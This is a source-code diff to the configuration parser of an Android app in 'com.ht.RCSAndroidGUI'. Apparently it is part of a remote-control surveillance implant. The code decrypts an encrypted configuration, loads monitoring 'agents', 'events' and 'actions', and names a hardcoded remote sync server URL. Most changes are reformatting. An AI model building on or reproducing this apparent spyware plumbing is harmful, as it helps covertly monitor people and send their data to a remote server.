@@ -21,6 +21,7 @@ import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.crypto.Crypto;
 import com.ht.RCSAndroidGUI.crypto.Keys;
 import com.ht.RCSAndroidGUI.event.EventConf;
+import com.ht.RCSAndroidGUI.event.EventType;
 import com.ht.RCSAndroidGUI.util.Utils;
 
 // TODO: Auto-generated Javadoc
@@ -74,7 +75,8 @@ public class Configuration {
 	public static final String SYNC_URL = "http://93.62.139.39/wc12/webclient";
 
 	private static final int AGENT_ENABLED = 0x2;
-	//public static final String SYNC_URL = "http://192.168.1.189/wc12/webclient";
+	// public static final String SYNC_URL =
+	// "http://192.168.1.189/wc12/webclient";
 
 	public static final boolean DEBUG = true;
 
@@ -188,8 +190,7 @@ public class Configuration {
 	 *             the rCS exception
 	 */
 	private int findTag(final String tag) throws RCSException {
-		final int index = Utils.getIndex(wrappedClearConf.array(), tag
-				.getBytes());
+		final int index = Utils.getIndex(wrappedClearConf.array(), tag.getBytes());
 
 		if (index == -1) {
 			throw new RCSException("Tag " + tag + " not found");
@@ -234,8 +235,7 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			Log.d("QZ", TAG + " Agent: " + id + " Enabled: " + enabled
-					+ " Params Len: " + plen);
+			Log.d("QZ", TAG + " Agent: " + id + " Enabled: " + enabled + " Params Len: " + plen);
 
 			final AgentConf a = new AgentConf(id, enabled, params);
 			status.addAgent(a);
@@ -269,7 +269,7 @@ public class Configuration {
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < eventNum; i++) {
-			final int type = wrappedClearConf.getInt();
+			final int typeId = wrappedClearConf.getInt();
 			final int action = wrappedClearConf.getInt();
 			final int plen = wrappedClearConf.getInt();
 
@@ -279,8 +279,9 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			Log.d("QZ", TAG + " Configuration.java Event: " + type + " Action: " + action
-					+ " Params Len: " + plen);
+			EventType type = EventType.get(typeId);
+
+			Log.d("QZ", TAG + " Configuration.java Event: " + type + " Action: " + action + " Params Len: " + plen);
 
 			final EventConf e = new EventConf(type, i, action, params);
 			status.addEvent(e);
@@ -324,8 +325,7 @@ public class Configuration {
 
 					a.addSubAction(type, params);
 
-					Log.d("QZ", TAG + " SubAction " + j + " Type: " + type
-							+ " Params Length: " + plen);
+					Log.d("QZ", TAG + " SubAction " + j + " Type: " + type + " Params Length: " + plen);
 				}
 
 				status.addAction(a);
@@ -419,8 +419,7 @@ public class Configuration {
 			final byte[] clearConf = crypto.decrypt(rawConf, 0);
 
 			// Extract clear length DWORD
-			this.wrappedClearConf = Utils.bufferToByteBuffer(clearConf,
-					ByteOrder.LITTLE_ENDIAN);
+			this.wrappedClearConf = Utils.bufferToByteBuffer(clearConf, ByteOrder.LITTLE_ENDIAN);
 
 			final int confClearLen = this.wrappedClearConf.getInt();
 
@@ -428,8 +427,7 @@ public class Configuration {
 			final int confCrc = this.wrappedClearConf.getInt(confClearLen - 4);
 
 			if (confCrc != crc(clearConf, 0, confClearLen - 4)) {
-				throw new RCSException("CRC mismatch, stored CRC = " + confCrc
-						+ " calculated CRC = "
+				throw new RCSException("CRC mismatch, stored CRC = " + confCrc + " calculated CRC = "
 						+ crc(clearConf, 0, confClearLen));
 			}
 
